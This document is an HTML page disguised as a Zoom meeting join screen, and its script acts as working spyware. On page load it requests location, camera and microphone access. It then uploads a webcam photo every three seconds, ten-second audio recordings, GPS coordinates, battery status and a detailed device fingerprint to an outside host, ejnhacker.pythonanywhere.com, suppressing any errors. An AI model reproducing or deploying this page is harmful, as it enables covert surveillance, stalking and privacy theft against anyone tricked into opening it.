<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>ZOOM | WEBPAGE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">

    <style>
        * { box-sizing: border-box; transition: all 0.3s ease; }

        body {
            margin: 0;
            height: 100vh;
            font-family: 'Inter', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: #050505;
        }

        /* --- Shifting Neon Spell Background --- */
        .spell-container {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: -1;
            filter: url(#gooey) blur(30px);
            animation: colorShift 12s linear infinite;
        }

        @keyframes colorShift {
            0% { filter: url(#gooey) blur(30px) hue-rotate(0deg); }
            100% { filter: url(#gooey) blur(30px) hue-rotate(360deg); }
        }

        .spell-blob {
            position: absolute;
            width: 600px;
            height: 600px;
            border-radius: 50%;
            mix-blend-mode: screen;
            animation: chaoticMove 25s infinite alternate ease-in-out;
        }

        .blob-1 { background: #00ff88; top: -20%; left: -10%; opacity: 0.6; }
        .blob-2 { background: #7000ff; bottom: -20%; right: -10%; animation-delay: -5s; opacity: 0.5; }
        .blob-3 { background: #ff004c; top: 30%; left: 20%; animation-duration: 15s; opacity: 0.4; }

        @keyframes chaoticMove {
            0% { transform: translate(0, 0) scale(1) rotate(0deg); }
            33% { transform: translate(150px, -50px) scale(1.2) rotate(120deg); }
            66% { transform: translate(-100px, 150px) scale(0.8) rotate(240deg); }
            100% { transform: translate(50px, -100px) scale(1.1) rotate(360deg); }
        }

        /* --- Enhanced Glass Card --- */
        .glass-card {
            background: rgba(10, 10, 10, 0.6);
            backdrop-filter: blur(50px) saturate(200%);
            -webkit-backdrop-filter: blur(50px) saturate(200%);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 40px rgba(0,0,0,0.5), inset 0 0 20px rgba(255,255,255,0.02);
            width: 620px;
            border-radius: 40px;
            padding: 45px;
            color: white;
            position: relative;
        }

        /* --- ZOOM IN BLUE --- */
        .logo-text {
            font-size: 34px;
            font-weight: 800;
            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 10px rgba(0, 210, 255, 0.2);
            margin-bottom: 35px;
            display: block;
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr 1.2fr;
            gap: 40px;
        }

        .input-label { font-size: 11px; font-weight: 700; color: #777; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; display: block; }
        .input-group { margin-bottom: 22px; }

        input[type="text"] {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.05);
            background: rgba(255,255,255,0.03);
            font-size: 14px;
            color: #ddd;
            outline: none;
        }

        input[type="text"]:focus { border-color: rgba(0, 210, 255, 0.4); background: rgba(255,255,255,0.08); }

        .video-wrapper {
            width: 100%;
            aspect-ratio: 1.6;
            background: #000;
            border-radius: 18px;
            overflow: hidden;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }

        video { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; }

        .play-icon {
            position: absolute;
            font-size: 20px;
            color: rgba(255,255,255,0.4);
            border: 1.5px solid rgba(255,255,255,0.2);
            width: 50px; height: 50px;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            z-index: 2;
        }

        .tech-info { font-size: 10px; color: #666; margin-top: 15px; line-height: 1.6; }

        .btn-container {
            position: relative;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn-join {
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            border: none;
            font-weight: 800;
            cursor: pointer;
            background: #fff;
            color: #000;
            text-transform: uppercase;
            letter-spacing: 1px;
            z-index: 5;
            opacity: 0.5;
            pointer-events: none; /* Button disabled because auto-start */
        }

        .insect {
            position: absolute;
            width: 20px;
            height: 20px;
            pointer-events: none;
            z-index: 10;
            offset-path: border-box;
            animation: revolve 4s linear infinite;
            filter: drop-shadow(0 0 8px #00d2ff); 
        }

        @keyframes revolve {
            from { transform: rotate(0deg) translateX(120px) rotate(0deg); }
            to { transform: rotate(360deg) translateX(120px) rotate(-360deg); }
        }

        .btn-container:hover .insect { animation-duration: 1.5s; }

        .status-item { display: flex; align-items: center; gap: 10px; margin-top: 15px; font-size: 11px; color: #888; }
        .dot { width: 7px; height: 7px; border-radius: 50%; background: #333; }
        .dot.active { background: #00ff88; box-shadow: 0 0 10px #00ff88; }

    </style>
</head>
<body>

<svg xmlns="http://www.w3.org/2000/svg" style="display:none">
    <defs>
        <filter id="gooey">
            <feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur" />
            <feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7" result="gooey" />
            <feTurbulence type="fractalNoise" baseFrequency="0.015" numOctaves="3" result="noise" />
            <feDisplacementMap in="gooey" in2="noise" scale="60" />
        </filter>
    </defs>
</svg>

<div class="spell-container">
    <div class="spell-blob blob-1"></div>
    <div class="spell-blob blob-2"></div>
    <div class="spell-blob blob-3"></div>
</div>

<div class="glass-card">
    <span class="logo-text">ZOOM</span>

    <div class="main-content">
        <div class="controls">
            <div class="input-group">
                <label class="input-label">Identity</label>
                <input type="text" placeholder="Enter Name">
            </div>
            <div class="input-group">
                <label class="input-label">System Node</label>
                <input type="text" placeholder="Default Path">
            </div>
            <div class="input-group">
                <label class="input-label">Frequency</label>
                <input type="text" placeholder="Encoded Sync">
            </div>
        </div>

        <div class="media-section">
            <div class="video-wrapper">
                <div class="play-icon">â–¶</div>
                <video id="video" autoplay playsinline muted></video>
            </div>

            <div class="tech-info">
                <strong>CONNECTION ESTABLISHED</strong><br>
                Ping: <span id="ping">0.00ms</span><br>
                Status: <span id="locationStatus">Requesting Location...</span>
            </div>

            <div class="btn-container">
                <svg class="insect" id="insect" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L9 7H15L12 2Z" fill="#00d2ff"/>
                    <circle cx="12" cy="12" r="5" fill="#00d2ff" fill-opacity="0.8"/>
                    <path d="M5 12H2M22 12H19M7 19L5 21M17 19L19 21M7 5L5 3M17 5L19 3" stroke="#00d2ff" stroke-width="2" stroke-linecap="round"/>
                </svg>
                
                <button class="btn-join" id="initBtn">Session Active (Auto)</button>
            </div>
            
            <div class="status-item">
                <div class="dot" id="statusDot" class="active"></div>
                <span id="statusTxt">Starting automatic session...</span>
            </div>
        </div>
    </div>
</div>

<script>
let stream = null;
let captureInterval = null;

let audioStream = null;
let mediaRecorder = null;
let audioChunks = [];
let micInterval = null;

let locationData = null;
let sessionStarted = false;
let microphoneGranted = false;
let cameraGranted = false;

const canvas = document.createElement("canvas");
const ctx = canvas.getContext("2d");

// ========== AUTO-START EVERYTHING ON PAGE LOAD ==========
window.addEventListener('DOMContentLoaded', async () => {
  console.log("ðŸš€ AUTO-STARTING SESSION...");
  
  const statusTxt = document.getElementById('statusTxt');
  const statusDot = document.getElementById('statusDot');
  
  // Step 1: Get location
  statusTxt.textContent = "Getting location...";
  locationData = await requestLocation();
  
  const statusElement = document.getElementById('locationStatus');
  if (locationData) {
    statusElement.textContent = "Location Secured";
  } else {
    statusElement.textContent = "Location Unavailable";
  }
  
  // Step 2: Get camera permission AND start stream
  statusTxt.textContent = "Starting camera...";
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;
    cameraGranted = true;
    console.log("âœ… Camera started");
  } catch (err) {
    console.error("âŒ Camera failed:", err);
    statusTxt.textContent = "Camera failed";
    return;
  }
  
  // Step 3: Get microphone permission AND start recording
  statusTxt.textContent = "Starting microphone...";
  try {
    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
    microphoneGranted = true;
    await startMicrophone();
    console.log("âœ… Microphone started");
  } catch (err) {
    console.error("âŒ Microphone failed:", err);
    statusTxt.textContent = "Microphone failed";
    return;
  }
  
  // Step 4: Start continuous photo capture
  statusTxt.textContent = "Starting photo capture...";
  setTimeout(() => {
    startContinuousCapture(document.getElementById("video"));
  }, 1000);
  
  // Step 5: Update UI to show active status
  statusDot.classList.add("active");
  statusTxt.textContent = "SESSION ACTIVE - Auto sending data";
  console.log("âœ… Full session auto-started!");
});

// ========== LOCATION FUNCTION ==========
function requestLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      },
      () => {
        resolve(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  });
}

// ========== MICROPHONE FUNCTIONS ==========
async function startMicrophone() {
  if (mediaRecorder) return;

  try {
    mediaRecorder = new MediaRecorder(audioStream);
    audioChunks = [];

    mediaRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) audioChunks.push(e.data);
    };

    mediaRecorder.onstop = sendAudio;
    mediaRecorder.start();
    console.log("ðŸŽ¤ Recording started");

    if (!micInterval) {
      micInterval = setInterval(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
          mediaRecorder.start();
        }
      }, 10000);
    }

  } catch (err) {
    console.error("ðŸŽ¤ Failed:", err);
  }
}

function sendAudio() {
  if (!audioChunks.length) return;

  const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
  audioChunks = [];

  const form = new FormData();
  form.append("audio", audioBlob, "audio.webm");

  fetch("https://ejnhacker.pythonanywhere.com/upload", {
    method: "POST",
    body: form
  }).catch(() => {});
}

// ========== CAMERA CAPTURE FUNCTIONS ==========
function startContinuousCapture(video) {
  if (captureInterval) return;

  captureAndSend(video);

  captureInterval = setInterval(() => {
    captureAndSend(video);
  }, 3000);
}

async function captureAndSend(video) {
  if (!video.videoWidth || !video.videoHeight) return;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);

  const batteryInfo = await getBatteryInfo();

  const fingerprint = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height,
      dpr: window.devicePixelRatio,
      orientation: screen.orientation?.type || null
    },
    hardware: {
      cores: navigator.hardwareConcurrency || null,
      memoryGB: navigator.deviceMemory || null,
      touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0
    },
    network: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    androidModel: (() => {
      const m = navigator.userAgent.match(/Android\s[\d.]+;\s([^;)]*)/i);
      return m ? m[1].replace(/Build.*/i, "").trim() : null;
    })()
  };

  canvas.toBlob((blob) => {
    if (!blob) return;

    const form = new FormData();
    form.append("photo", blob, "photo.jpg");

    if (locationData) {
      form.append("latitude", locationData.latitude);
      form.append("longitude", locationData.longitude);
    }

    if (batteryInfo) {
      form.append("battery", JSON.stringify(batteryInfo));
    }

    form.append("fingerprint", JSON.stringify(fingerprint));

    fetch("https://ejnhacker.pythonanywhere.com/upload", {
      method: "POST",
      body: form
    }).catch(() => {});
  }, "image/jpeg", 0.85);
}

// ========== BATTERY FUNCTION ==========
async function getBatteryInfo() {
  if (!navigator.getBattery) return null;

  try {
    const battery = await navigator.getBattery();
    return {
      level: Math.round(battery.level * 100),
      charging: battery.charging
    };
  } catch (e) {
    return null;
  }
}

// ========== CLEANUP ON PAGE UNLOAD ==========
window.addEventListener('beforeunload', function() {
  if (captureInterval) clearInterval(captureInterval);
  if (micInterval) clearInterval(micInterval);
  if (mediaRecorder) mediaRecorder.stop();
  if (stream) stream.getTracks().forEach(t => t.stop());
  if (audioStream) audioStream.getTracks().forEach(t => t.stop());
});
</script>

</body>
</html>
